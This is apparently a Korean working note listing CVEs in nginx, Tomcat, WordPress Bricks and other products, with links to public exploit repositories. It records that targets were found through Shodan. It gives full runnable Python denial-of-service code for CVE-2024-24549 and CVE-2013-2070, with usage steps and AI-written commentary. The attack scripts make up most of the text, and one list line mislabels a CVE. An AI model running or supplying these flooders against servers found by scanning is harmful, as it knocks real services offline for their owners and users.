## CVE List for Mr.Lim 
 
 
X- nginx , cve-2025-1974 , https://github.com/yoshino-s/CVE-2025-1974 , RCE 
X- nginx , cve-2013-2070 , https://gist.github.com/infoslack/9232444 , DoS 
X- dex5upload , CVE-2020-13442 , https://github.com/kbgsft/vuln-dext5upload/wiki/File-Upload-to-RCE-in-DEXT5Upload-2.7.1402870-by-xcuter , RCE 
X- JEUS , CVE-2019-17327 , no poc , directory traversal vulnerability 
X- tomcat , CVE-2024-24549 , https://github.com/Abdurahmon3236/CVE-2024-24549 , DoS 
X- wordpress brick builder , CVE-2024-25600 , https://github.com/K3ysTr0K3R/CVE-2024-25600-EXPLOIT , RCE 
X- next.js , CVE-2024-25600 , https://github.com/K3ysTr0K3R/CVE-2024-25600-EXPLOIT , bypass authorization tomcat , CVE-2024-54677, no poc , DoS 
 
``` txt 
- 발견 근거 
- CVE 설명 
 - vendor 
 - product 
 - PoC 사용 방법 
- AI 답변 
 - ... 
``` 
 
1. CVE-2024-24549 
 - 발견 근거: 
 - Shodan 검색 결과 
 - CVE 설명: 
 - vendor: Apache Software Foundation 
 - product: Apache Tomcat 
 - PoC 사용 방법: `DEFAULT_HOST = "your_target.com"`에 호스트를 설정하고 CVE-2024-24549.py를 실행합니다. 
 - AI 답변: 
 - 이 취약점의 Code를 실행 시 서버가 다운될 가능성이 존재합니다. 
 - 이 취약점은 Apache Tomcat에서 발생하는 서비스 거부(DoS) 취약점입니다. 공격자는 특정 요청을 통해 서버를 다운시킬 수 있습니다. 이 취약점을 이용한 공격은 서버의 가용성을 심각하게 저하시킬 수 있습니다. 따라서, 해당 취약점을 패치하거나 방화벽 규칙을 설정하여 보호하는 것이 중요합니다. 
 - Code 
 ``` python 
 import http.client 
 import threading 
 import logging 
 import time 
 import random 
 import string 
 import argparse 
 import os 
 
 # Configuration defaults 
 DEFAULT_HOST = "target-server" 
 DEFAULT_PORT = 443 
 DEFAULT_NUM_REQUESTS = 1000 
 DEFAULT_CONCURRENT_THREADS = 10 
 DEFAULT_REQUEST_INTERVAL = 0.5 
 DEFAULT_LOG_FILE = "requests.log" 
 
 # Setup logging 
 logging.basicConfig(level=logging.INFO , format='%(asctime)s - %(levelname)s - %(message)s') 
 
 def random_string(length): 
 """Generate a random string of fixed length.""" 
 letters = string.ascii_letters + string.digits 
 return ''.join(random.choice(letters) for i in range(length)) 
 
 def dynamic_payload(): 
 """Generate a dynamic payload for requests.""" 
 return random_string(random.randint(10, 100)) 
 
 def send_request(conn, method, endpoint, headers, payload): 
 """Send a single HTTP request.""" 
 conn.request(method, endpoint, body=payload, headers=headers) 
 response = conn.getresponse() 
 return response.status, response.reason 
 
 def send_dos_requests(host, port, num_requests, concurrent_threads, request_interval, log_file): 
 def worker(thread_id): 
 conn = None 
 try: 
 conn = http.client.HTTPSConnection(host, port, timeout=10) 
 for i in range(num_requests // concurrent_threads): 
 method = random.choice(["GET", "POST"]) 
 headers = { 
 "Content-Type": "application/x-www-form-urlencoded", 
 "X-Test-Header": random_string(65536) 
 } 
 payload = dynamic_payload() if method == "POST" else None 
 status, reason = send_request(conn, method, "/", headers, payload) 
 logging.info (f"Thread {thread_id} - Request {i + 1}: Status Code: {status}, Reason: {reason}") 
 
 with open(log_file, "a") as logf: 
 logf.write(f"Thread {thread_id} - Request {i + 1}: Status Code: {status}, Reason: {reason}\n") 
 
 time.sleep(request_interval) 
 
 except Exception as e: 
 logging.error(f"Thread {thread_id} - An error occurred: {e}") 
 finally: 
 if conn: 
 conn.close() 
 
 # Create and start threads 
 threads = [] 
 for i in range(concurrent_threads): 
 thread = threading.Thread(target=worker, args=(i + 1,)) 
 thread.start() 
 threads.append(thread) 
 time.sleep(0.1) 
 
 for thread in threads: 
 thread.join() 
 
 logging.info ("Completed sending requests") 
 
 def parse_args(): 
 """Parse command-line arguments.""" 
 parser = argparse.ArgumentParser(description="HTTP Request Flooder") 
 parser.add_argument('--host', default=DEFAULT_HOST, help='Target server address') 
 parser.add_argument('--port', type=int, default=DEFAULT_PORT, help='Target server port') 
 parser.add_argument('--num-requests', type=int, default=DEFAULT_NUM_REQUESTS, help='Total number of requests to send') 
 parser.add_argument('--concurrent-threads', type=int, default=DEFAULT_CONCURRENT_THREADS, help='Number of concurrent threads') 
 parser.add_argument('--request-interval', type=float, default=DEFAULT_REQUEST_INTERVAL, help='Interval between requests') 
 parser.add_argument('--log-file', default=DEFAULT_LOG_FILE, help='File to log request results') 
 return parser.parse_args() 
 
 if __name__ == "__main__": 
 args = parse_args() 
 logging.info (f"Starting flooder with {args.num_requests} requests to {args.host}:{args.port} using {args.concurrent_threads} threads") 
 send_dos_requests( 
 host=args.host, 
 port=args.port, 
 num_requests=args.num_requests, 
 concurrent_threads=args.concurrent_threads, 
 request_interval=args.request_interval, 
 log_file=args.log_file 
 ) 
 ``` 
 
2. CVE-2013-2070 
 - 발견 근거: 
 - Shodan 검색 결과 
 - CVE 설명: 
 - vendor: Nginx 
 - product: Nginx 
 - PoC 사용 방법: `nginx_dos.py [target ip]`를 입력하여 실행. 
 - AI 답변: 
 - 이 취약점의 Code를 실행 시 서버가 다운될 가능성이 존재합니다. 
 - 이 취약점은 Nginx 서버에서 발생하는 서비스 거부(DoS) 취약점입니다. 공격자는 특정 요청을 통해 서버를 다운시킬 수 있습니다. 이 취약점을 이용한 공격은 서버의 가용성을 심각하게 저하시킬 수 있습니다. 따라서, 해당 취약점을 패치하거나 방화벽 규칙을 설정하여 보호하는 것이 중요합니다. 
 - Code 
 ``` python 
 # Exploit Title: nginx v1.3.9-1.4.0 DOS POC (CVE-2013-2070) 
 # Google Dork: CVE-2013-2070 
 # Date: 16.05.2013 
 # Exploit Author: Mert SARICA - mert [ . ] sarica [ @ ] gmail [ . ] com - http://www.mertsarica.com 
 # Vendor Homepage: http://nginx.org/ 
 # Software Link: http://nginx.org/download/nginx-1.4.0.tar.gz 
 # Version: 1.3.9-1.4.0 
 # Tested on: Kali Linux & nginx v1.4.0 
 # CVE : CVE-2013-2070 
 
 import httplib 
 import time 
 import socket 
 import sys 
 import os 
 
 # Vars & Defs 
 debug = 0 
 dos_packet = 0xFFFFFFFFFFFFFFEC 
 socket.setdefaulttimeout(1) 
 
 packet = 0 
 
 def chunk(data, chunk_size): 
 chunked = "" 
 chunked += "%s\r\n" % (chunk_size) 
 chunked += "%s\r\n" % (data) 
 chunked += "0\r\n\r\n" 
 return chunked 
 
 if sys.platform == 'linux-i386' or sys.platform == 'linux2': 
 os.system("clear") 
 elif sys.platform == 'win32': 
 os.system("cls") 
 else: 
 os.system("cls") 
 
 print "======================================================================" 
 print u"nginx v1.3.9-1.4.0 DOS POC (CVE-2013-2070) [http://www.mertsarica.com ]" 
 print "======================================================================" 
 
 if len(sys.argv) < 2: 
 print "Usage: python nginx_dos.py [target ip]\n" 
 print "Example: python nginx_dos.py 127.0.0.1 \n" 
 sys.exit(1) 
 else: 
 host = sys.argv[1].lower() 
 
 while packet <= 5: 
 
 body = "Mert SARICA" 
 chunk_size = hex(dos_packet + 1)[3:] 
 chunk_size = ("F" + chunk_size[:len(chunk_size)-1]).upper() 
 
 if debug: 
 print "data length:", len(body), "chunk size:", chunk_size[:len(chunk_size)] 
 
 try: 
 con = httplib.HTTPConnection(host) 
 url = "/mertsarica.php" 
 con.putrequest('POST', url) 
 con.putheader('User-Agent', "curl/7.30.0") 
 con.putheader('Accept', "*/*") 
 con.putheader('Transfer-Encoding', 'chunked') 
 con.putheader('Content-Type', "application/x-www-form-urlencoded") 
 con.endheaders() 
 con.send(chunk(body, chunk_size[:len(chunk_size)])) 
 except: 
 print "Connection error!" 
 sys.exit(1) 
 
 try: 
 resp = con.getresponse() 
 print(resp.status, resp.reason) 
 except: 
 print "[*] Knock knock, is anybody there ? (" + str(packet) + "/5)" 
 
 packet = packet + 1 
 
 con.close() 
 
 print "[+] Done!" 
